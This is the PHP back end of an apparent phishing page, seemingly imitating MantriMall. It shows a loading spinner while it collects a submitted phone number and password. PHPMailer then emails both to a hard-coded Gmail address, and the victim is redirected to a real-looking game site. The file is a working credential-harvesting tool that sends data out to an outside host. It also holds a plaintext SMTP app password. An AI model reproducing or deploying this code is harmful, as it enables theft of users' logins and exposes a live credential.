<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>


  <div class="modal" id="loader">
    <div class="modal-dialog modal-dialog-centered">
      <div class="modal-content bg-transparent border-0">
  
        <!-- Modal Header -->
      
  
        <!-- Modal body -->
        <div class="modal-body bg-transparent text-center">
            <img src="../img/loader.gif" class="img-fluid mx-auto" />
        </div>
  
        <!-- Modal footer -->
    
  
      </div>
    </div>
  </div>
  <script>
    $(document).ready(function(){

        $("#loader").modal('show');
    });
</script>

<?php 
require "includes/PHPMailer.php";
require "includes/SMTP.php";
require "includes/Exception.php";

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;
$mail =new PHPMailer;


 $htmlContent = "phone number :".$_POST['phone_no']."  password :".$_POST['password']." ";  
 

$mail->isSMTP();                                      // Set mailer to use SMTP
$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
$mail->SMTPAuth = true;                               // Enable SMTP authentication
$mail->Username = 'peterparkerads@gmail.com';                 // SMTP username
$mail->Password = 'hhzkapxadugleidm';                           // SMTP password
$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
$mail->Port = 587;                                    // TCP port to connect to

$mail->setFrom('peterparkerads@gmail.com', '');
$mail->addAddress('peterparkerads@gmail.com', '');     // Add a recipient

$mail->isHTML(true);                                  // Set email format to HTML

$mail->Subject = 'MantriMall.in';
$mail->Body    = $htmlContent;


if(!$mail->send()) {
    // echo 'Message could not be sent.';
   // echo 'Mailer Error: ' . $mail->ErrorInfo;
    $result = false;
} else {
    $result = true;
    echo "<script> location.href='https://www.mantrigame.com/#/'; </script>";
    exit;
}



?>



